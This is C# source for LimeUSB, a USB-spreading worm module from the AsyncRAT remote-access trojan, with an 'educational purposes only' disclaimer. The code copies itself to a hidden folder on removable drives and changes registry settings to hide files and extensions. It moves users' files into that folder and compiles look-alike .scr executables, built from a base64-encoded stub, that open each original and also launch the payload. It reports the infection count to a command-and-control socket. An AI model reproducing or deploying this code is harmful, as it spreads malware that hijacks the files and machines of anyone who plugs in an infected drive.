using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Drawing.IconLib; // AsyncRAT-C#\packages\IconLib
using Microsoft.Win32;
using System.Drawing;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Client.MessagePack;
using Client.Sockets;
using System.Threading;
using System.Windows.Forms;
//
//       │ Author     : NYAN CAT
//       │ Name       : LimeUSB v0.3

//       Contact Me   : https://github.com/NYAN-x-CAT
//       This program Is distributed for educational purposes only.
//

namespace Client.Handle_Packet
{
    class LimeUSB
    {
        public void Run()
        {
            Initialize();
        }

        private void Initialize()
        {
            ExplorerOptions();
            int count = 0;
            foreach (DriveInfo USB in DriveInfo.GetDrives())
            {
                try
                {
                    if (USB.DriveType == DriveType.Removable && USB.IsReady)
                    {
                        count += 1;
                        if (!Directory.Exists(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory))
                        {
                            Directory.CreateDirectory(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory);
                            File.SetAttributes(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                        }

                        if (!Directory.Exists((USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory)))
                            Directory.CreateDirectory((USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory));

                        if (!File.Exists(USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile))
                            File.Copy(Application.ExecutablePath, USB.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);

                        CreteDirectory(USB.RootDirectory.ToString());

                        InfectFiles(USB.RootDirectory.ToString());
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Initialize " + ex.Message);
                }
            }
            if (count != 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "usbSpread";
                msgpack.ForcePathObject("Count").AsString = count.ToString();
                ClientSocket.BeginSend(msgpack.Encode2Bytes());
            }

        }

        private void ExplorerOptions()
        {
            try
            {
                RegistryKey Key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
                if (Key.GetValue("Hidden") != (object)2)
                    Key.SetValue("Hidden", 2);
                if (Key.GetValue("HideFileExt") != (object)1)
                    Key.SetValue("HideFileExt", 1);
            }
            catch { }
        }

        private void InfectFiles(string Path)
        {
            foreach (var file in Directory.GetFiles(Path))
            {
                try
                {
                    if (CheckIfInfected(file))
                    {
                        ChangeIcon(file);
                        File.Move(file, file.Insert(3, spreadSettings.WorkDirectory + "\\"));
                        CompileFile(file);
                    }
                }
                catch { }
            }

            foreach (var directory in Directory.GetDirectories(Path))
            {
                if (!directory.Contains(spreadSettings.WorkDirectory))
                    InfectFiles(directory);
            }
        }

        private void CreteDirectory(string USB_Directory)
        {
            foreach (var directory in Directory.GetDirectories(USB_Directory))
            {
                try
                {
                    if (!directory.Contains(spreadSettings.WorkDirectory))
                    {
                        if (!Directory.Exists(directory.Insert(3, spreadSettings.WorkDirectory + "\\")))
                            Directory.CreateDirectory(directory.Insert(3, spreadSettings.WorkDirectory + "\\"));
                        CreteDirectory(directory);
                    }
                }
                catch { }
            }
        }

        private bool CheckIfInfected(string file)
        {
            try
            {
                FileVersionInfo info = FileVersionInfo.GetVersionInfo(file);
                if (info.LegalTrademarks == spreadSettings.InfectedTrademark)
                    return false;
                else
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void ChangeIcon(string file)
        {
            try
            {
                Icon FileIcon = Icon.ExtractAssociatedIcon(file);
                MultiIcon MultiIcon = new MultiIcon();
                SingleIcon SingleIcon = MultiIcon.Add(Path.GetFileName(file));
                SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista);
                SingleIcon.Save(Path.GetPathRoot(file) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
            }
            catch { }
        }

        private void CompileFile(string InfectedFile)
        {
            try
            {
                string Source = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbYXNzZW1ibHk6IEFzc2VtYmx5VHJhZGVtYXJrKCIlTGltZSUiKV0KW2Fzc2VtYmx5OiBHdWlkKCIlR3VpZCUiKV0KCnN0YXRpYyBjbGFzcyBMaW1lVVNCTW9kdWxlCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJUZpbGUlIik7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJVBheWxvYWQlIik7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQp9"));
                Source = Source.Replace("%Payload%", Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
                Source = Source.Replace("%File%", InfectedFile.Insert(3, spreadSettings.WorkDirectory + "\\"));
                Source = Source.Replace("%Lime%", spreadSettings.InfectedTrademark);
                Source = Source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                Source = Source.Replace("%Guid%", Guid.NewGuid().ToString());

                CompilerParameters CParams = new CompilerParameters();
                Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();
                ProviderOptions.Add("CompilerVersion", GetOS());

                string options = "/target:winexe /platform:x86 /optimize+";
                if (File.Exists(Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico"))
                    options += " /win32icon:\"" + Path.GetPathRoot(InfectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico" + "\"";
                CParams.GenerateExecutable = true;
                CParams.OutputAssembly = InfectedFile + ".scr";
                CParams.CompilerOptions = options;
                CParams.TreatWarningsAsErrors = false;
                CParams.IncludeDebugInformation = false;
                CParams.ReferencedAssemblies.Add("System.dll");

                CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(CParams, Source);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("CompileFile " + ex.Message);
            }
        }

        private string GetOS()
        {
            var OS = new Microsoft.VisualBasic.Devices.ComputerInfo();
            if (OS.OSFullName.Contains("7"))
                return "v2.0";
            else
                return "v4.0";
        }

        private string Randomz(int L)
        {
            string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            StringBuilder sb = new StringBuilder();
            Random rand = new Random();
            for (int i = 1; i <= L; i++)
            {
                int idx = rand.Next(0, validchars.Length);
                char randomChar = validchars[idx];
                sb.Append(randomChar);
            }
            var randomString = sb.ToString();
            return randomString;
        }
    }

    public class spreadSettings
    {
        public static readonly string InfectedTrademark = "Trademark - Lime";
        public static readonly string WorkDirectory = "$LimeUSB";
        public static readonly string LimeUSBFile = Path.GetFileName(Application.ExecutablePath);
        public static readonly string IconsDirectory = "$LimeIcons";
    }
}
